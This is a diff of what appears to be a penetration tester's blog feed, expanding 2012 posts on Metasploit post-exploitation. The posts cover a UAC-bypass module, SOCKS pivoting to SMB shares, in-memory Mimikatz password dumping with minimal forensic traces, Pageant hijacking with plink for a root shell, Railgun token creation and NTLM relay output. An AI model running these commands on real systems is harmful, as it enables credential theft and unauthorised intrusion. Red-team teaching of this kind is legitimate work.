-&amp;ldquo;Old&amp;rdquo; module post/windows/escalate/bypassuac:
-I decided to give it a bit of a face lift:
-&amp;ldquo;New&amp;rdquo; local exploit module exploit/windows/local/bypassuac:
-All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.</description>
+      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module &lt;code&gt;post/windows/escalate/bypassuac&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module &lt;code&gt;exploit/windows/local/bypassuac&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;
+
+&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;
+
+&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and yes it supports EXE::Custom.&lt;/p&gt;
+
+&lt;p&gt;2) It lets you know if it will be able to bypass the current setting of UAC or not:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Even when you&amp;rsquo;re going overkill with it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(ASK module if UAC is disabled will just elevate without any kind of user prompt)&lt;/p&gt;
+
+&lt;p&gt;And of course it works as expected if UAC needs bypassing:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One thing I have yet to update is a simple check to make sure you are an admin that can actually bypass UAC. If you aren&amp;rsquo;t, then you&amp;rsquo;ll be leaving this lovely calling card behind for the user:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_bypassuac_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -113,7 +417,61 @@ All of the credit for the availability of this module goes to @egyp7 though, wit
       <pubDate>Sun, 21 Oct 2012 07:40:11 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</guid>
-      <description>One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)</description>
+      <description>&lt;p&gt;One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)&lt;/p&gt;
+
+&lt;p&gt;Now, there is a stub in Metasploit that I have been unable to complete due to my lack of knowledge in the shell code world. The stub allows you to create payloads that have static proxies, which basically invalidates the need for the following. Until then here is a few ways to set / read the proxy settings for SYSTEM or any other user for that matter.&lt;/p&gt;
+
+&lt;p&gt;Its here if you want to take a whack at it: &lt;code&gt;external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the ways @&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;carnal0wnage&lt;/a&gt; and I demoed @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; was using the bitsadmin binary. Windows7/Vista/2008 come with version 2.0+ which has this great ability to run the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;bitsadmin /util /setieproxy localsystem MANUAL_PROXY 192.168.1.55:3128 &amp;quot;;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;(2000,XP,2003 you could upload a copy of bitsadmin that was new enough and that would still work)&lt;/p&gt;
+
+&lt;p&gt;That command sets the proxy settings for the SYSTEM account. I was able to jump through hoops and do this remotely by using the windows/exec payload via psexec, then reverse_http(s) would work.&lt;/p&gt;
+
+&lt;p&gt;But I wanted a better way to do this. I watched the execution of bitsadmin to see what it was doing and all it was actually doing is setting a registry key. Awesome, I can do that.&lt;/p&gt;
+
+&lt;p&gt;Enter enum_proxy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you&amp;rsquo;ve noticed that RHOST option, Metasploit has the ability to do remote registry calls as well (this module will attempt to start the RemoteRegistry service if the user has the privilege to do so):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Output from it finding a disabled RemoteRegistry:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf post(enum_proxy) &amp;gt; run
+
+[-] Unable to contact remote registry service on 172.16.10.217
+[*] Attempting to start service remotely...
+[*] Proxy Counter = 9
+[*] Setting: WPAD and AutoConfigure script
+[*] AutoConfigURL: http://anotherproxyserver/pac.pac
+[*] Post module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;ldquo;Awesome but you promised setting the proxy settings&amp;rdquo;, well right now all I can give you is a cloner ;-)&lt;/p&gt;
+
+&lt;p&gt;Enter clone_proxy_settings module:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_proxy_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And thats it. Still working on an actual &amp;ldquo;set_proxy&amp;rdquo; module, but this should do for now, and a lot less to type.&lt;/p&gt;
+
+&lt;p&gt;As of this post both are currently pull requests:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/942&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/942&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/943&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/943&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
     </item>
     
     <item>
@@ -122,10 +480,46 @@ All of the credit for the availability of this module goes to @egyp7 though, wit
       <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
-      <description>Ok, this is pretty straight forward no magic:
-Got a shell, doesn&amp;rsquo;t have to be SYSTEM
-Add a route to the internal range or directly to the host you want over the session you want
-Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.</description>
+      <description>&lt;p&gt;Ok, this is pretty straight forward no magic:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Got a shell, doesn&amp;rsquo;t have to be SYSTEM&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Add a route to the internal range or directly to the host you want over the session you want&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;
+
+&lt;p&gt;And just to love it working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_smb_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;
+
+&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -134,8 +528,20 @@ Mosy on over to the Socks4a module. And in another terminal we need to make sure
       <pubDate>Thu, 04 Oct 2012 09:07:57 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</guid>
-      <description>Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: https://github.com/mubix/q
-This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created or just found and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason.</description>
+      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_q_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: &lt;a href=&#34;https://github.com/mubix/q&#34;&gt;https://github.com/mubix/q&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created &lt;strong&gt;or just found&lt;/strong&gt; and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason. (Like the fear of @egyp7 ‘s coding red pen)&lt;/p&gt;
+
+&lt;p&gt;While I completely understand the reason and possible backlash Metasploit and subsequently Rapid7 might get for housing modules that were not submitted by their original owners, or violate some TOS, I feel that those modules should not simply disappear into time.&lt;/p&gt;
+
+&lt;p&gt;With that said, if a module gets added to this repo by another person and the other contacts me to take it down I certainly will.&lt;/p&gt;
+
+&lt;p&gt;So if you have modules, scripts, resource files or anything else that you would like to share, please submit a pull request, and we’ll see about getting it shared out for other people to use.&lt;/p&gt;
+
+&lt;p&gt;P.S. I am, as evident by this blog, a friend of the framework, so I would do my best to remove the blockage that is stopping the item from being in the Metasploit trunk if at all possible. This repo / exploit pack is meant to support the framework, not subjugate it in any way.&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -144,9 +550,34 @@ This repository / exploit pack was created for the sole purpose to house modules
       <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
-      <description>Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
-(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)
-Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job.</description>
+      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here: &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt; has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;
+
+&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;meterpreter&amp;gt; execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &#39;&amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_mimikatz_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The downloads for Mimikatz are were they always are: &lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn: &lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome work &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here: &lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -155,8 +586,41 @@ Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing
       <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
-      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
-meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>
+      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
+[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
+[*] Saved SSH Server Public Keys:
+[*]     rsa2@22:172.16.10.150
+[*] Session corp_webserver:
+[*]     Protocol: SSH
+[*]     Hostname: 172.16.10.150
+[*]     Username: root
+[*]     Public Key:
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+Process 3364 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
+plink -agent root@172.16.10.150
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
+No mail.
+Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
+root@172.16.10.150:~]$ id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -165,9 +629,39 @@ meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administ
       <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
-      <description>With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.
-A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:
-w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right?</description>
+      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;
+
+&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;
+
+&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;
+
+&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_zombies_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;
+
+&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;quot;lpStartupInfo&amp;quot;]
+client.railgun.advapi32.CreateProcessWithLogonW(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON_WITH_PROFILE&amp;quot;,&amp;quot;notepad.exe&amp;quot;,nil,0,nil,nil,a,32)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.advapi32.LogonUserA(&amp;quot;USER&amp;quot;,&amp;quot;DOMAIN&amp;quot;,&amp;quot;PASSWORD&amp;quot;,&amp;quot;LOGON32_LOGON_INTERACTIVE&amp;quot;,&amp;quot;LOGON32_PROVIDER_DEFAULT&amp;quot;,4)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -176,12 +670,69 @@ w00t, we the user is present, we can migrate our meterepreter session into that 
       <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</guid>
-      <description>Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
-Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
-Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
-Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170
-You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
-And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):</description>
+      <description>&lt;p&gt;Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_pth_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Twitter Link: &lt;a href=&#34;https://twitter.com/webstersprodigy/status/222529916783169536&#34;&gt;https://twitter.com/webstersprodigy/status/222529916783169536&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Which has a link to here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/589&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/589&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Demo / Example resource files: &lt;a href=&#34;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&#34;&gt;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can pull the fork w/ branch from here: &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;
+
+&lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
+[*] 172.16.10.163 http_ntlmrelay - ----Contents----
+[*] 172.16.10.163 http_ntlmrelay - hi ima secret
+[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
+[*] 172.16.10.163 http_ntlmrelay - .rnd
+[*] 172.16.10.163 http_ntlmrelay - PerfLogs
+[*] 172.16.10.163 http_ntlmrelay - config.sys
+[*] 172.16.10.163 http_ntlmrelay - inetpub
+[*] 172.16.10.163 http_ntlmrelay - xampp
+[*] 172.16.10.163 http_ntlmrelay - ProgramData
+[*] 172.16.10.163 http_ntlmrelay - MSOCache
+[*] 172.16.10.163 http_ntlmrelay - secret.txt
+[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
+[*] 172.16.10.163 http_ntlmrelay - Windows
+[*] 172.16.10.163 http_ntlmrelay - Users
+[*] 172.16.10.163 http_ntlmrelay - Program Files
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
+[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
+[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
+[*] 172.16.10.163 http_ntlmrelay - Creating a new service
+[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
+[*] 172.16.10.163 http_ntlmrelay - Opening service...
+[*] 172.16.10.163 http_ntlmrelay - Starting the service...
+&lt;/code&gt;&lt;/pre&gt;
+
